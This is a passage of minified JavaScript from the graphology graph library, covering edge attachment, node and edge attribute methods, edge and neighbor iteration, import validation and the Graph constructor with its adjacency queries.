graph.'));u=1===n?c.source:c.target,s=i,h=o}return[u,s,h]}Y.prototype.clear=function(){this.inDegree=0,this.outDegree=0,this.undirectedDegree=0,this.undirectedLoops=0,this.directedLoops=0,this.in={},this.out={},this.undirected={}},W.prototype.clear=function(){this.inDegree=0,this.outDegree=0,this.directedLoops=0,this.in={},this.out={}},K.prototype.clear=function(){this.undirectedDegree=0,this.undirectedLoops=0,this.undirected={}},H.prototype.attach=function(){var t="out",e="in";this.undirected&&(t=e="undirected");var n=this.source.key,r=this.target.key;this.source[t][r]=this,this.undirected&&n===r||(this.target[e][n]=this)},H.prototype.attachMulti=function(){var t="out",e="in",n=this.source.key,r=this.target.key;this.undirected&&(t=e="undirected");var i=this.source[t],o=i[r];if(void 0===o)return i[r]=this,void(this.undirected&&n===r||(this.target[e][n]=this));o.previous=this,this.next=o,i[r]=this,this.target[e][n]=this},H.prototype.detach=function(){var t=this.source.key,e=this.target.key,n="out",r="in";this.undirected&&(n=r="undirected"),delete this.source[n][e],delete this.target[r][t]},H.prototype.detachMulti=function(){var t=this.source.key,e=this.target.key,n="out",r="in";this.undirected&&(n=r="undirected"),void 0===this.previous?void 0===this.next?(delete this.source[n][e],delete this.target[r][t]):(this.next.previous=void 0,this.source[n][e]=this.next,this.target[r][t]=this.next):(this.previous.next=this.next,void 0!==this.next&&(this.next.previous=this.previous))};var $=[{name:function(t){return"get".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i){var o=X(this,e,n,t,r,i),a=o[0],u=o[1];return a.attributes[u]}}},{name:function(t){return"get".concat(t,"Attributes")},attacher:function(t,e,n){t.prototype[e]=function(t,r){return X(this,e,n,t,r)[0].attributes}}},{name:function(t){return"has".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i){var o=X(this,e,n,t,r,i),a=o[0],u=o[1];return a.attributes.hasOwnProperty(u)}}},{name:function(t){return"set".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i,o){var a=X(this,e,n,t,r,i,o),u=a[0],c=a[1],s=a[2];return u.attributes[c]=s,this.emit("nodeAttributesUpdated",{key:u.key,type:"set",attributes:u.attributes,name:c}),this}}},{name:function(t){return"update".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i,o){var a=X(this,e,n,t,r,i,o),u=a[0],c=a[1],s=a[2];if("function"!=typeof s)throw new F("Graph.".concat(e,": updater should be a function."));var h=u.attributes,f=s(h[c]);return h[c]=f,this.emit("nodeAttributesUpdated",{key:u.key,type:"set",attributes:u.attributes,name:c}),this}}},{name:function(t){return"remove".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i){var o=X(this,e,n,t,r,i),a=o[0],u=o[1];return delete a.attributes[u],this.emit("nodeAttributesUpdated",{key:a.key,type:"remove",attributes:a.attributes,name:u}),this}}},{name:function(t){return"replace".concat(t,"Attributes")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i){var o=X(this,e,n,t,r,i),a=o[0],u=o[1];if(!s(u))throw new F("Graph.".concat(e,": provided attributes are not a plain object."));return a.attributes=u,this.emit("nodeAttributesUpdated",{key:a.key,type:"replace",attributes:a.attributes}),this}}},{name:function(t){return"merge".concat(t,"Attributes")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i){var o=X(this,e,n,t,r,i),a=o[0],c=o[1];if(!s(c))throw new F("Graph.".concat(e,": provided attributes are not a plain object."));return u(a.attributes,c),this.emit("nodeAttributesUpdated",{key:a.key,type:"merge",attributes:a.attributes,data:c}),this}}},{name:function(t){return"update".concat(t,"Attributes")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i){var o=X(this,e,n,t,r,i),a=o[0],u=o[1];if("function"!=typeof u)throw new F("Graph.".concat(e,": provided updater is not a function."));return a.attributes=u(a.attributes),this.emit("nodeAttributesUpdated",{key:a.key,type:"update",attributes:a.attributes}),this}}}],V=[{name:function(t){return"get".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r){var i;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>2){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var o=""+t,a=""+r;if(r=arguments[2],!(i=c(this,o,a,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(o,'" - "').concat(a,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(i=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}return i.attributes[r]}}},{name:function(t){return"get".concat(t,"Attributes")},attacher:function(t,e,n){t.prototype[e]=function(t){var r;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>1){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var i=""+t,o=""+arguments[1];if(!(r=c(this,i,o,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(i,'" - "').concat(o,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(r=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}return r.attributes}}},{name:function(t){return"has".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r){var i;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>2){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var o=""+t,a=""+r;if(r=arguments[2],!(i=c(this,o,a,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(o,'" - "').concat(a,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(i=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}return i.attributes.hasOwnProperty(r)}}},{name:function(t){return"set".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i){var o;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>3){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var a=""+t,u=""+r;if(r=arguments[2],i=arguments[3],!(o=c(this,a,u,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(a,'" - "').concat(u,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(o=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}return o.attributes[r]=i,this.emit("edgeAttributesUpdated",{key:o.key,type:"set",attributes:o.attributes,name:r}),this}}},{name:function(t){return"update".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r,i){var o;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>3){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var a=""+t,u=""+r;if(r=arguments[2],i=arguments[3],!(o=c(this,a,u,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(a,'" - "').concat(u,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(o=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}if("function"!=typeof i)throw new F("Graph.".concat(e,": updater should be a function."));return o.attributes[r]=i(o.attributes[r]),this.emit("edgeAttributesUpdated",{key:o.key,type:"set",attributes:o.attributes,name:r}),this}}},{name:function(t){return"remove".concat(t,"Attribute")},attacher:function(t,e,n){t.prototype[e]=function(t,r){var i;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>2){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var o=""+t,a=""+r;if(r=arguments[2],!(i=c(this,o,a,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(o,'" - "').concat(a,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(i=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}return delete i.attributes[r],this.emit("edgeAttributesUpdated",{key:i.key,type:"remove",attributes:i.attributes,name:r}),this}}},{name:function(t){return"replace".concat(t,"Attributes")},attacher:function(t,e,n){t.prototype[e]=function(t,r){var i;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>2){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var o=""+t,a=""+r;if(r=arguments[2],!(i=c(this,o,a,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(o,'" - "').concat(a,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(i=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}if(!s(r))throw new F("Graph.".concat(e,": provided attributes are not a plain object."));return i.attributes=r,this.emit("edgeAttributesUpdated",{key:i.key,type:"replace",attributes:i.attributes}),this}}},{name:function(t){return"merge".concat(t,"Attributes")},attacher:function(t,e,n){t.prototype[e]=function(t,r){var i;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>2){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var o=""+t,a=""+r;if(r=arguments[2],!(i=c(this,o,a,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(o,'" - "').concat(a,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(i=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}if(!s(r))throw new F("Graph.".concat(e,": provided attributes are not a plain object."));return u(i.attributes,r),this.emit("edgeAttributesUpdated",{key:i.key,type:"merge",attributes:i.attributes,data:r}),this}}},{name:function(t){return"update".concat(t,"Attributes")},attacher:function(t,e,n){t.prototype[e]=function(t,r){var i;if("mixed"!==this.type&&"mixed"!==n&&n!==this.type)throw new B("Graph.".concat(e,": cannot find this type of edges in your ").concat(this.type," graph."));if(arguments.length>2){if(this.multi)throw new B("Graph.".concat(e,": cannot use a {source,target} combo when asking about an edge's attributes in a MultiGraph since we cannot infer the one you want information about."));var o=""+t,a=""+r;if(r=arguments[2],!(i=c(this,o,a,n)))throw new q("Graph.".concat(e,': could not find an edge for the given path ("').concat(o,'" - "').concat(a,'").'))}else{if("mixed"!==n)throw new B("Graph.".concat(e,": calling this method with only a key (vs. a source and target) does not make sense since an edge with this key could have the other type."));if(t=""+t,!(i=this._edges.get(t)))throw new q("Graph.".concat(e,': could not find the "').concat(t,'" edge in the graph.'))}if("function"!=typeof r)throw new F("Graph.".concat(e,": provided updater is not a function."));return i.attributes=r(i.attributes),this.emit("edgeAttributesUpdated",{key:i.key,type:"update",attributes:i.attributes}),this}}}],Z=T,J=z,Q=function(){var t=arguments,e=null,n=-1;return new Z((function(){for(var r=null;;){if(null===e){if(++n>=t.length)return{done:!0};e=J(t[n])}if(!0!==(r=e.next()).done)break;e=null}return r}))},tt=[{name:"edges",type:"mixed"},{name:"inEdges",type:"directed",direction:"in"},{name:"outEdges",type:"directed",direction:"out"},{name:"inboundEdges",type:"mixed",direction:"in"},{name:"outboundEdges",type:"mixed",direction:"out"},{name:"directedEdges",type:"directed"},{name:"undirectedEdges",type:"undirected"}];function et(t,e,n,r){var i=!1;for(var o in e)if(o!==r){var a=e[o];if(i=n(a.key,a.attributes,a.source.key,a.target.key,a.source.attributes,a.target.attributes,a.undirected),t&&i)return a.key}}function nt(t,e,n,r){var i,o,a,u=!1;for(var c in e)if(c!==r){i=e[c];do{if(o=i.source,a=i.target,u=n(i.key,i.attributes,o.key,a.key,o.attributes,a.attributes,i.undirected),t&&u)return i.key;i=i.next}while(void 0!==i)}}function rt(t,e){var n,r=Object.keys(t),i=r.length,o=0;return new T((function(){do{if(n)n=n.next;else{if(o>=i)return{done:!0};var a=r[o++];if(a===e){n=void 0;continue}n=t[a]}}while(!n);return{done:!1,value:{edge:n.key,attributes:n.attributes,source:n.source.key,target:n.target.key,sourceAttributes:n.source.attributes,targetAttributes:n.target.attributes,undirected:n.undirected}}}))}function it(t,e,n,r){var i=e[n];if(i){var o=i.source,a=i.target;return r(i.key,i.attributes,o.key,a.key,o.attributes,a.attributes,i.undirected)&&t?i.key:void 0}}function ot(t,e,n,r){var i=e[n];if(i){var o=!1;do{if(o=r(i.key,i.attributes,i.source.key,i.target.key,i.source.attributes,i.target.attributes,i.undirected),t&&o)return i.key;i=i.next}while(void 0!==i)}}function at(t,e){var n=t[e];return void 0!==n.next?new T((function(){if(!n)return{done:!0};var t={edge:n.key,attributes:n.attributes,source:n.source.key,target:n.target.key,sourceAttributes:n.source.attributes,targetAttributes:n.target.attributes,undirected:n.undirected};return n=n.next,{done:!1,value:t}})):T.of({edge:n.key,attributes:n.attributes,source:n.source.key,target:n.target.key,sourceAttributes:n.source.attributes,targetAttributes:n.target.attributes,undirected:n.undirected})}function ut(t,e,n,r){if(0!==e.size)for(var i,o,a="mixed"!==n&&n!==e.type,u="undirected"===n,c=!1,s=e._edges.values();!0!==(i=s.next()).done;)if(o=i.value,!a||o.undirected===u){var h=o,f=h.key,l=h.attributes,d=h.source,p=h.target;if(c=r(f,l,d.key,p.key,d.attributes,p.attributes,o.undirected),t&&c)return f}}function ct(t,e,n,r,i,o){var a,u=e?nt:et;if("undirected"!==n){if("out"!==r&&(a=u(t,i.in,o),t&&a))return a;if("in"!==r&&(a=u(t,i.out,o,r?void 0:i.key),t&&a))return a}if("directed"!==n&&(a=u(t,i.undirected,o),t&&a))return a}function st(t,e,n,r,i,o,a){var u,c=n?ot:it;if("undirected"!==e){if(void 0!==i.in&&"out"!==r&&(u=c(t,i.in,o,a),t&&u))return u;if(void 0!==i.out&&"in"!==r&&(r||i.key!==o)&&(u=c(t,i.out,o,a),t&&u))return u}if("directed"!==e&&void 0!==i.undirected&&(u=c(t,i.undirected,o,a),t&&u))return u}var ht=[{name:"neighbors",type:"mixed"},{name:"inNeighbors",type:"directed",direction:"in"},{name:"outNeighbors",type:"directed",direction:"out"},{name:"inboundNeighbors",type:"mixed",direction:"in"},{name:"outboundNeighbors",type:"mixed",direction:"out"},{name:"directedNeighbors",type:"directed"},{name:"undirectedNeighbors",type:"undirected"}];function ft(){this.A=null,this.B=null}function lt(t,e,n,r,i){for(var o in r){var a=r[o],u=a.source,c=a.target,s=u===n?c:u;if(!e||!e.has(s.key)){var h=i(s.key,s.attributes);if(t&&h)return s.key}}}function dt(t,e,n,r,i){if("mixed"!==e){if("undirected"===e)return lt(t,null,r,r.undirected,i);if("string"==typeof n)return lt(t,null,r,r[n],i)}var o,a=new ft;if("undirected"!==e){if("out"!==n){if(o=lt(t,null,r,r.in,i),t&&o)return o;a.wrap(r.in)}if("in"!==n){if(o=lt(t,a,r,r.out,i),t&&o)return o;a.wrap(r.out)}}if("directed"!==e&&(o=lt(t,a,r,r.undirected,i),t&&o))return o}function pt(t,e,n){var r=Object.keys(n),i=r.length,o=0;return new T((function(){var a=null;do{if(o>=i)return t&&t.wrap(n),{done:!0};var u=n[r[o++]],c=u.source,s=u.target;a=c===e?s:c,t&&t.has(a.key)&&(a=null)}while(null===a);return{done:!1,value:{neighbor:a.key,attributes:a.attributes}}}))}function yt(t,e,n,r,i){for(var o,a,u,c,s,h,f,l=r._nodes.values(),d=r.type;!0!==(o=l.next()).done;){var p=!1;if(a=o.value,"undirected"!==d)for(u in c=a.out){s=c[u];do{if(h=s.target,p=!0,f=i(a.key,h.key,a.attributes,h.attributes,s.key,s.attributes,s.undirected),t&&f)return s;s=s.next}while(s)}if("directed"!==d)for(u in c=a.undirected)if(!(e&&a.key>u)){s=c[u];do{if((h=s.target).key!==u&&(h=s.source),p=!0,f=i(a.key,h.key,a.attributes,h.attributes,s.key,s.attributes,s.undirected),t&&f)return s;s=s.next}while(s)}if(n&&!p&&(f=i(a.key,null,a.attributes,null,null,null,null),t&&f))return null}}function gt(t){if(!s(t))throw new F('Graph.import: invalid serialized node. A serialized node should be a plain object with at least a "key" property.');if(!("key"in t))throw new F("Graph.import: serialized node is missing its key.");if("attributes"in t&&(!s(t.attributes)||null===t.attributes))throw new F("Graph.import: invalid attributes. Attributes should be a plain object, null or omitted.")}function vt(t){if(!s(t))throw new F('Graph.import: invalid serialized edge. A serialized edge should be a plain object with at least a "source" & "target" property.');if(!("source"in t))throw new F("Graph.import: serialized edge is missing its source.");if(!("target"in t))throw new F("Graph.import: serialized edge is missing its target.");if("attributes"in t&&(!s(t.attributes)||null===t.attributes))throw new F("Graph.import: invalid attributes. Attributes should be a plain object, null or omitted.");if("undirected"in t&&"boolean"!=typeof t.undirected)throw new F("Graph.import: invalid undirectedness information. Undirected should be boolean or omitted.")}ft.prototype.wrap=function(t){null===this.A?this.A=t:null===this.B&&(this.B=t)},ft.prototype.has=function(t){return null!==this.A&&t in this.A||null!==this.B&&t in this.B};var mt,_t=(mt=255&Math.floor(256*Math.random()),function(){return mt++}),bt=new Set(["directed","undirected","mixed"]),wt=new Set(["domain","_events","_eventsCount","_maxListeners"]),xt={allowSelfLoops:!0,multi:!1,type:"mixed"};function kt(t,e,n){var r=new t.NodeDataClass(e,n);return t._nodes.set(e,r),t.emit("nodeAdded",{key:e,attributes:n}),r}function Mt(t,e,n,r,i,o,a,u){if(!r&&"undirected"===t.type)throw new B("Graph.".concat(e,": you cannot add a directed edge to an undirected graph. Use the #.addEdge or #.addUndirectedEdge instead."));if(r&&"directed"===t.type)throw new B("Graph.".concat(e,": you cannot add an undirected edge to a directed graph. Use the #.addEdge or #.addDirectedEdge instead."));if(u&&!s(u))throw new F("Graph.".concat(e,': invalid attributes. Expecting an object but got "').concat(u,'"'));if(o=""+o,a=""+a,u=u||{},!t.allowSelfLoops&&o===a)throw new B("Graph.".concat(e,': source & target are the same ("').concat(o,"\"), thus creating a loop explicitly forbidden by this graph 'allowSelfLoops' option set to false."));var c=t._nodes.get(o),h=t._nodes.get(a);if(!c)throw new q("Graph.".concat(e,': source node "').concat(o,'" not found.'));if(!h)throw new q("Graph.".concat(e,': target node "').concat(a,'" not found.'));var f={key:null,undirected:r,source:o,target:a,attributes:u};if(n)i=t._edgeKeyGenerator();else if(i=""+i,t._edges.has(i))throw new B("Graph.".concat(e,': the "').concat(i,'" edge already exists in the graph.'));if(!t.multi&&(r?void 0!==c.undirected[a]:void 0!==c.out[a]))throw new B("Graph.".concat(e,': an edge linking "').concat(o,'" to "').concat(a,"\" already exists. If you really want to add multiple edges linking those nodes, you should create a multi graph by using the 'multi' option."));var l=new H(r,i,c,h,u);t._edges.set(i,l);var d=o===a;return r?(c.undirectedDegree++,h.undirectedDegree++,d&&(c.undirectedLoops++,t._undirectedSelfLoopCount++)):(c.outDegree++,h.inDegree++,d&&(c.directedLoops++,t._directedSelfLoopCount++)),t.multi?l.attachMulti():l.attach(),r?t._undirectedSize++:t._directedSize++,f.key=i,t.emit("edgeAdded",f),i}function Et(t,e,n,r,i,o,a,c,h){if(!r&&"undirected"===t.type)throw new B("Graph.".concat(e,": you cannot merge/update a directed edge to an undirected graph. Use the #.mergeEdge/#.updateEdge or #.addUndirectedEdge instead."));if(r&&"directed"===t.type)throw new B("Graph.".concat(e,": you cannot merge/update an undirected edge to a directed graph. Use the #.mergeEdge/#.updateEdge or #.addDirectedEdge instead."));if(c)if(h){if("function"!=typeof c)throw new F("Graph.".concat(e,': invalid updater function. Expecting a function but got "').concat(c,'"'))}else if(!s(c))throw new F("Graph.".concat(e,': invalid attributes. Expecting an object but got "').concat(c,'"'));var f;if(o=""+o,a=""+a,h&&(f=c,c=void 0),!t.allowSelfLoops&&o===a)throw new B("Graph.".concat(e,': source & target are the same ("').concat(o,"\"), thus creating a loop explicitly forbidden by this graph 'allowSelfLoops' option set to false."));var l,d,p=t._nodes.get(o),y=t._nodes.get(a);if(!n&&(l=t._edges.get(i))){if(!(l.source.key===o&&l.target.key===a||r&&l.source.key===a&&l.target.key===o))throw new B("Graph.".concat(e,': inconsistency detected when attempting to merge the "').concat(i,'" edge with "').concat(o,'" source & "').concat(a,'" target vs. ("').concat(l.source.key,'", "').concat(l.target.key,'").'));d=l}if(d||t.multi||!p||(d=r?p.undirected[a]:p.out[a]),d){var g=[d.key,!1,!1,!1];if(h?!f:!c)return g;if(h){var v=d.attributes;d.attributes=f(v),t.emit("edgeAttributesUpdated",{type:"replace",key:d.key,attributes:d.attributes})}else u(d.attributes,c),t.emit("edgeAttributesUpdated",{type:"merge",key:d.key,attributes:d.attributes,data:c});return g}c=c||{},h&&f&&(c=f(c));var m={key:null,undirected:r,source:o,target:a,attributes:c};if(n)i=t._edgeKeyGenerator();else if(i=""+i,t._edges.has(i))throw new B("Graph.".concat(e,': the "').concat(i,'" edge already exists in the graph.'));var _=!1,b=!1;p||(p=kt(t,o,{}),_=!0,o===a&&(y=p,b=!0)),y||(y=kt(t,a,{}),b=!0),l=new H(r,i,p,y,c),t._edges.set(i,l);var w=o===a;return r?(p.undirectedDegree++,y.undirectedDegree++,w&&(p.undirectedLoops++,t._undirectedSelfLoopCount++)):(p.outDegree++,y.inDegree++,w&&(p.directedLoops++,t._directedSelfLoopCount++)),t.multi?l.attachMulti():l.attach(),r?t._undirectedSize++:t._directedSize++,m.key=i,t.emit("edgeAdded",m),[i,!0,_,b]}function At(t,e){t._edges.delete(e.key);var n=e.source,r=e.target,i=e.attributes,o=e.undirected,a=n===r;o?(n.undirectedDegree--,r.undirectedDegree--,a&&(n.undirectedLoops--,t._undirectedSelfLoopCount--)):(n.outDegree--,r.inDegree--,a&&(n.directedLoops--,t._directedSelfLoopCount--)),t.multi?e.detachMulti():e.detach(),o?t._undirectedSize--:t._directedSize--,t.emit("edgeDropped",{key:e.key,attributes:i,source:n.key,target:r.key,undirected:o})}var St=function(n){function r(t){var e;if(e=n.call(this)||this,"boolean"!=typeof(t=u({},xt,t)).multi)throw new F("Graph.constructor: invalid 'multi' option. Expecting a boolean but got \"".concat(t.multi,'".'));if(!bt.has(t.type))throw new F('Graph.constructor: invalid \'type\' option. Should be one of "mixed", "directed" or "undirected" but got "'.concat(t.type,'".'));if("boolean"!=typeof t.allowSelfLoops)throw new F("Graph.constructor: invalid 'allowSelfLoops' option. Expecting a boolean but got \"".concat(t.allowSelfLoops,'".'));var r="mixed"===t.type?Y:"directed"===t.type?W:K;f(a(e),"NodeDataClass",r);var i="geid_"+_t()+"_",o=0;return f(a(e),"_attributes",{}),f(a(e),"_nodes",new Map),f(a(e),"_edges",new Map),f(a(e),"_directedSize",0),f(a(e),"_undirectedSize",0),f(a(e),"_directedSelfLoopCount",0),f(a(e),"_undirectedSelfLoopCount",0),f(a(e),"_edgeKeyGenerator",(function(){var t;do{t=i+o++}while(e._edges.has(t));return t})),f(a(e),"_options",t),wt.forEach((function(t){return f(a(e),t,e[t])})),l(a(e),"order",(function(){return e._nodes.size})),l(a(e),"size",(function(){return e._edges.size})),l(a(e),"directedSize",(function(){return e._directedSize})),l(a(e),"undirectedSize",(function(){return e._undirectedSize})),l(a(e),"selfLoopCount",(function(){return e._directedSelfLoopCount+e._undirectedSelfLoopCount})),l(a(e),"directedSelfLoopCount",(function(){return e._directedSelfLoopCount})),l(a(e),"undirectedSelfLoopCount",(function(){return e._undirectedSelfLoopCount})),l(a(e),"multi",e._options.multi),l(a(e),"type",e._options.type),l(a(e),"allowSelfLoops",e._options.allowSelfLoops),l(a(e),"implementation",(function(){return"graphology"})),e}e(r,n);var i=r.prototype;return i._resetInstanceCounters=function(){this._directedSize=0,this._undirectedSize=0,this._directedSelfLoopCount=0,this._undirectedSelfLoopCount=0},i.hasNode=function(t){return this._nodes.has(""+t)},i.hasDirectedEdge=function(t,e){if("undirected"===this.type)return!1;if(1===arguments.length){var n=""+t,r=this._edges.get(n);return!!r&&!r.undirected}if(2===arguments.length){t=""+t,e=""+e;var i=this._nodes.get(t);return!!i&&i.out.hasOwnProperty(e)}throw new F("Graph.hasDirectedEdge: invalid arity (".concat(arguments.length,", instead of 1 or 2). You can either ask for an edge id or for the existence of an edge between a source & a target."))},i.hasUndirectedEdge=function(t,e){if("directed"===this.type)return!1;if(1===arguments.length){var n=""+t,r=this._edges.get(n);return!!r&&r.undirected}if(2===arguments.length){t=""+t,e=""+e;var i=this._nodes.get(t);return!!i&&i.undirected.hasOwnProperty(e)}throw new F("Graph.hasDirectedEdge: invalid arity (".concat(arguments.length,", instead of 1 or 2). You can either ask for an edge id or for the existence of an edge between a source & a target."))},i.hasEdge=function(t,e){if(1===arguments.length){var n=""+t;return this._edges.has(n)}if(2===arguments.length){t=""+t,e=""+e;var r=this._nodes.get(t);return!!r&&(void 0!==r.out&&r.out.hasOwnProperty(e)||void 0!==r.undirected&&r.undirected.hasOwnProperty(e))}throw new F("Graph.hasEdge: invalid arity (".concat(arguments.length,", instead of 1 or 2). You can either ask for an edge id or for the existence of an edge between a source & a target."))},i.directedEdge=function(t,e){if("undirected"!==this.type){if(t=""+t,e=""+e,this.multi)throw new B("Graph.directedEdge: this method is irrelevant with multigraphs since there might be multiple edges between source & target. See #.directedEdges instead.");var n=this._nodes.get(t);if(!n)throw new q('Graph.directedEdge: could not find the "'.concat(t,'" source node in the graph.'));if(!this._nodes.has(e))throw new q('Graph.directedEdge: could not find the "'.concat(e,'" target node in the graph.'));var r=n.out&&n.out[e]||void 0;return r?r.key:void 0}},i.undirectedEdge=function(t,e){if("directed"!==this.type){if(t=""+t,e=""+e,this.multi)throw new B("Graph.undirectedEdge: this method is irrelevant with multigraphs since there might be multiple edges between source & target. See #.undirectedEdges instead.");var n=this._nodes.get(t);if(!n)throw new q('Graph.undirectedEdge: could not find the "'.concat(t,'" source node in the graph.'));if(!this._nodes.has(e))throw new q('Graph.undirectedEdge: could not find the "'.concat(e,'" target node in the graph.'));var r=n.undirected&&n.undirected[e]||void 0;return r?r.key:void 0}},i.edge=function(t,e){if(this.multi)throw new B("Graph.edge: this method is irrelevant with multigraphs since there might be multiple edges between source & target. See #.edges instead.");t=""+t,e=""+e;var n=this._nodes.get(t);if(!n)throw new q('Graph.edge: could not find the "'.concat(t,'" source node in the graph.'));if(!this._nodes.has(e))throw new q('Graph.edge: could not find the "'.concat(e,'" target node in the graph.'));var r=n.out&&n.out[e]||n.undirected&&n.undirected[e]||void 0;if(r)return r.key},i.areDirectedNeighbors=function(t,e){t=""+t,e=""+e;var n=this._nodes.get(t);if(!n)throw new q('Graph.areDirectedNeighbors: could not find the "'.concat(t,'" node in the graph.'));return"undirected"!==this.type&&(e in n.in||e in n.out)},i.areOutNeighbors=function(t,e){t=""+t,e=""+e;var n=this._nodes.get(t);if(!n)throw new q('Graph.areOutNeighbors: could not find the "'.concat(t,'" node in the graph.'));return"undirected"!==this.type&&e in n.out},i.areInNeighbors=function(t,e){t=""+t,e=""+e;var n=this._nodes.get(t);if(!n)throw new q('Graph.areInNeighbors: could not find the "'.concat(t,'" node in the graph.'));return"undirected"!==this.type&&e in n.in},i.areUndirectedNeighbors=function(t,e){t=""+t,e=""+e;var n=this._nodes.get(t);if(!n)throw new q('Graph.areUndirectedNeighbors: could not find the "'.concat(t,'" node in the graph.'));return"directed"!==this.type&&e in n.undirected},i.areNeighbors=function(t,e){t=""+t,e=""+e;var n=this._nodes.get(t);if(!n)throw new q('Graph.areNeighbors: could not find the "'.concat(t,'" node in the graph.'));return"undirected"!==this.type&&(e in n.in||e in n.out)||"directed"!==this.type&&e in n.undirected},i.areInboundNeighbors=function(t,e){t=""+t,e=""+e;var n=this._nodes.get(t);if(!n)throw new q('Graph.areInboundNeighbors: could not find the "'.concat(t,'" node in the graph.'));return"undirected"!==this.type&&e in n.in||"directed"!==this.type&&e in n.undirected},i.areOutboundNeighbors=function(t,e){t=""+t,e=""+e;var n=this._nodes.get(t);if(!n)throw new q('Graph.areOutboundNeighbors: could not find the "'.concat(t,'" node in the graph.'));return"undirected"!==this.type&&e in n.out||"directed"!==this.type&&e in n.undirected},i.inDegree=function(t){t=""+t;var e=this._nodes.get(t);if(!e)throw new q('Graph.inDegree: could not find the 